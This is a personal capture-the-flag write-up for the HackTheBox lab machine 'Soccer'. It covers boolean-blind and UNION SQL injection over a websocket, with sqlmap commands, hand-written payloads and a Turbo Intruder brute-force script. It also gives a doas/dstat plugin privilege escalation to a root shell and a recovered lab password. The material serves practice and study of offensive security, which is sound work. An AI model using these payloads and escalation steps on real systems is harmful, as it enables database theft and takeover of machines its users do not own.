# Soccer \[Linux Easy]

{% embed url="https://0xdf.gitlab.io/2023/06/10/htb-soccer.html" %}
Best sqli explaination, make a script to automate this tho ik you can do it
{% endembed %}

## Report

A reverse shell exploit via TinyFileManager shows another vhost `soc-player.htb` at `/etc/nginx/sites-enabled/soc-player.htb`. This site has a login and input field which checks whether a ticket exists or not. This field is vulnerable to boolean blind SQLi and can be exploited to find database, table, column and field values respectively.

Eventually we find creds for user `player`. Login via SSH and user has SUID set for `doas`, refer GTFOBins and become root

## Cheatsheet

<pre class="language-sql"><code class="lang-sql">sqlmap -u ws://soc-player.soccer.htb:9091 --dbs --data '{"id": "1234"}' --dbms mysql --batch --level 5 --risk 3 --threads 1 -v 6
sqlmap --flush-session -u ws://soc-player.soccer.htb:9091 -D soccer_db --data '{"id": "1234"}' --dbms mysql --tables --batch --level 5 --risk 3 --threads 1 -v 6

"id":"12 or 1=1-- -"
"id":"12 UNION select 1,2,3-- -"
"id":"0 UNION select user,2,3 from mysql.user where user like 'r%'-- -"

"id": "0 OR (select count(*) from information_schema.schemata)=5"
"id":"0 OR MID((SELECT DISTINCT(schema_name) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 4,1),2,1)='o'"

"id": "0 OR (select count(*) from soccer_db.accounts)=1"
"id": "0 OR MID((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='soccer_db' LIMIT 0,1),1,1)='a'"

"id": "0 OR (select count(*) from information_schema.COLUMNS WHERE TABLE_SCHEMA='soccer_db' and TABLE_NAME='accounts')=4"
"id": "0 OR MID((SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema='soccer_db' and table_name='accounts' LIMIT 0,1),1,1)='i'"
#ALTERNATIVE USING UNION - MATCH NUMBER OF COLUMNS AS ORIGINAL QUERY FIRST
"id": "0 UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='soccer_db' and TABLE_NAME='accounts' and COLUMN_NAME like 'i%'"

"id": "0 OR MID((SELECT username FROM soccer_db.accounts LIMIT 0,1),1,1)='p'"
"id": "0 OR MID((SELECT password FROM soccer_db.accounts LIMIT 0,1),1,1)='p'"
"id": "0 OR ASCII(MID((SELECT password FROM soccer_db.accounts LIMIT 0,1),1,1))=80"
<strong>#'p' and 'P' both returned true hence we use ASCII 
</strong>#Did not enumerate length of username and password

</code></pre>

```python
#Generate charlist
file =  open('smallcharlist.txt','w+') 
for i in range (97,123):
    file.write(chr(i)+'\n')
file.close()
```

```python
#Body in Request Panel of WebSocket Turbo Intruder
{
"id": "0 OR MID((SELECT username FROM soccer_db.accounts LIMIT 0,1),$1,1)='$2'"
}

import time
def queue_websockets(upgrade_request, message):
    connection1 = websocket_connection.create(upgrade_request)
    template = message
    with open('/home/jtripz/htb/scripts/smallcharlist.txt') as file: 
        for i in range(1,10):
            for line in file:
                time.sleep (0.17)
                payload = build_payload(template,str(i), line.strip())
                connection1.queue(payload)
            file.seek(0)

def build_payload (template, *args):
    return_payload = template
    for i in range (0, len(args)):
        return_payload = return_payload.replace('$'+str(i+1), args[i])
    return return_payload
    

def handle_outgoing_message(websocket_message):
    results_table.add(websocket_message)

def handle_incoming_message(websocket_message):
    if websocket_message.getLength()==13:
        results_table.add(websocket_message)
```

```
find / -perm -4000 2>/dev/null
find / -name doas.conf 2>/dev/null
echo 'import os; os.system("/bin/bash")' > /usr/local/share/dstat/dstat_jtripz.py
doas /usr/bin/dstat --jtripz
```

## Loot

### Creds

player:PlayerOftheMatch2022

### Proof

#### SQL Injection over websockets

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption><p>Right Click -> Extensions -> Send to WebSocket Turbo Intruder</p></figcaption></figure>

After so much research, we found a github cheatsheet for sqli enumeration without sqlmap in the SQLi Contd page. Using sqlmap in verbose gave a lot of info as well as the methodology and tables/schema to use.

`LIMIT` (offset \[start from 0], no. of rows), `MID/SUBSTRING` (string, pos \[start from 1], length)

It's very important to identify what kind of injection is actually possible (time, bool etc.) which is why payload all the things helps get you the initial structure for the query and the rest you can manipulate to your liking.

`sqlmap` showed time and boolean injections were possible\
`OR` and `UNION` injections were also possible as shown, one key difference being with `OR` we narrowed it down to a `True` or `False` singular value whereas `UNION` you need to match the number of columns the original query was structured. The following tables give us all the info we need

`information_schema.schemata`\
`information_schema.tables`\
`information_schema.columns`

Since this was over websockets (port 9091) our wfuzz commands we found wont work, plus this boolean based blind SQLi - every character has to enumerated individually

A valid response is 13 characters long, hence we only output response for replies with length 13

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

ASCII values from 32 to 127 cover all alphabets, numbers and special characters
